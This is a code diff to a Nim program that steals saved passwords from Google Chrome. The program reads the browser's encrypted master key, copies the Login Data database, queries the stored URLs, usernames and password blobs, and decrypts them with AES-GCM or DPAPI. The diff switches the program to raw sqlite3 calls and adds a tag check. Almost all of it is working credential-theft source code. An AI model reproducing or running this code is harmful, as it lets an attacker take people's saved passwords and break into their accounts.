@@ -9,8 +9,9 @@ import os
 import json
 import base64
 import winim/inc/wincrypt
-import db_sqlite
+import sqlite3
 import nimcrypto/[rijndael, bcmode]
+import winim/lean
 
 proc cryptUnprotectData(data: openarray[byte]): string =
     var dataIn, dataOut: DATA_BLOB
@@ -21,7 +22,7 @@ proc cryptUnprotectData(data: openarray[byte]): string =
         result.setLen(dataOut.cbData)
         if dataOut.cbData != 0:
             copyMem(addr result[0], dataOut.pbData, dataOut.cbData)   
-
+        LocalFree(cast[HLOCAL](dataOut.pbData))
 
 proc getMasterKey(): string =
     let filename = getEnv("USERPROFILE") & r"\AppData\Local\Google\Chrome\User Data\Local State"
@@ -35,9 +36,10 @@ proc getMasterKey(): string =
 
 
 proc passDecrypt(data: openarray[byte]): string =
+    #echo data
     var key {.global.}: string
     
-    if data[0..<3] == [byte 118, 49, 48]:   #chrome version > 80
+    if data[0 ..< 3] == [byte 118, 49, 48]:   #chrome version > 80
         if key.len() == 0:
             key = getMasterKey()
             
@@ -45,12 +47,16 @@ proc passDecrypt(data: openarray[byte]): string =
             ctx: GCM[aes256]
             aad: seq[byte]
             iv = data[3 ..< 3 + 12]
-            encrypted = data[3 + 12 ..< data.len - 16]
+            encrypted = data[3 + 12 ..< data.len() - 16]
+            tag = data[data.len() - 16 ..< data.len()]
+            dtag: array[aes256.sizeBlock, byte]
             
         if encrypted.len() > 0:
             result.setLen(encrypted.len())
             ctx.init(key.toOpenArrayByte(0, key.len() - 1), iv, aad)
             ctx.decrypt(encrypted, result.toOpenArrayByte(0, result.len() - 1))
+            ctx.getTag(dtag)
+            assert(dtag == tag)
     else:
         result = cryptUnprotectData(data)   #chrome version < 80
         
@@ -59,13 +65,30 @@ proc main() =
     let tempFileName = getTempDir() & "Login Data"
     copyFile(filename, tempFileName)
     if fileExists(tempFileName):
-        let db = open(tempFileName, "", "", "")
-        for row in db.fastRows(sql"SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"):
-            echo "URL: ", row[0]
-            echo "USER: ", row[1]
-            echo "PASS: ", passDecrypt(toOpenArrayByte(row[2], 0, row[2].len() - 1 ))
-            echo ""
-        db.close()
+        var
+            db: PSqlite3
+            rc: int
+            tail : ptr cstring
+            stmt: PStmt = nil
+            zSql: cstring = "SELECT action_url, username_value, password_value FROM logins"
+            
+        discard open(tempFileName, db)
+        var msg = prepare(db, zSql, -1, stmt, tail)
+        if msg == SQLITE_OK:
+            rc = stmt.step()
+            while rc == SQLITE_ROW :
+                echo "Url: ", column_text(stmt, 0)
+                echo "User: ", column_text(stmt, 1)
+                var blobData: seq[byte]
+                blobData.setLen(int(column_bytes(stmt, 2)))
+                copyMem(unsafeAddr(blobData[0]), column_blob(stmt, 2), int(column_bytes(stmt, 2)))
+                echo "Pass: ", passDecrypt(blobData)
+                echo ""
+                
+                rc = stmt.step()
+                
+            discard finalize(stmt)
+            discard close(db)
         
     removeFile(tempFileName)
     
